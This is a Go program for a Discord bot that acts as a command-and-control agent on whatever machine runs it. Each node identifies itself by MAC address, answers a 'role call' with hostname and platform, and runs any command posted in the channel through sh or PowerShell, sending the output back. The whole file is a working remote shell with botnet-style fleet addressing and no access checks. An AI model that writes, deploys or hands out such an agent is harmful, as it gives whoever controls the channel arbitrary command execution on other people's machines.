package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
)

//global stuff for shortcuts
var p = fmt.Println

var ID = "" // ID used for telling machines apart. Will be based on MAC address

func main() {

	// Generating the node's unique ID
	ID = generateGUID()

	// Setting up the token
	btok, _ := ioutil.ReadFile("token")
	token := string(btok)
	token = strings.Replace(token, "\n", "", -1)

	// Setting up Bot connection
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		p(err.Error())
		return
	}

	dg.AddHandler(messageHandler)

	err = dg.Open()

	if err != nil {
		p(err.Error())
		return
	}

	p("Bot is up")

	// Wait here until CTRL-C or other term signal is received.
	p("Bot is now running. Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()

}

func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {

	// Ignore all messages created by the bot itself
	if m.Author.ID == s.State.User.ID {
		return
	}

	if strings.Contains(strings.ToLower(m.Content), "!test") {
		s.ChannelMessageSend(m.ChannelID, "testSuccesfull")
	}

	// Running command if sent to all nodes
	if strings.HasPrefix(m.Content, "! ") {
		command_string := m.Content[2:len(m.Content)] // get everything after the '! '
		p(command_string)

		out, errorMessage := runCommand(command_string)

		if errorMessage != "" {
			p(errorMessage)
			s.ChannelMessageSend(m.ChannelID, "```"+errorMessage+"```")
			return
		}
		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
	}

	if strings.HasPrefix(m.Content, ID+": ") {
		command_string := m.Content[len(ID+": "):len(m.Content)]
		p(command_string)

		out, errorMessage := runCommand(command_string)
		if errorMessage != "" {
			p(errorMessage)
			s.ChannelMessageSend(m.ChannelID, "```"+errorMessage+"```")
			return
		}
		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
	}

	// Roll call
	if strings.ToLower(m.Content) == "role call" {
		name, err := os.Hostname()
		if err != nil {
			p(err.Error())
			return
		}

		outString := "Hostname: " + name + "\n" + "ID: " + ID + "\n" + "Platform: " + runtime.GOOS + " " + runtime.GOARCH

		s.ChannelMessageSend(m.ChannelID, "```"+outString+"```")

	}

	p(m.Author.Username, ": ", m.Content)

}

func runCommand(command string) (outString string, errorMessage string) {

	var shell string
	errorMessage = ""

	// Selecting which shell to use
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "sh"
	}

	// run command, and if it causes an error create an error
	out, err := exec.Command(shell, "-c", command).Output()
	if err != nil {
		p(err.Error())
		errorMessage = err.Error()

		return
	}

	outString = string(out)

	return

}

func generateGUID() string {
	// gets the machines network interfaces
	ifas, err := net.Interfaces()
	if err != nil {
		return ""
	}

	address := ifas[0].HardwareAddr.String()       // gets the MAC(hardware) address from the first network interface
	address = strings.ReplaceAll(address, ":", "") // removes the : so it's easier to copy and paste

	return string(address)
}
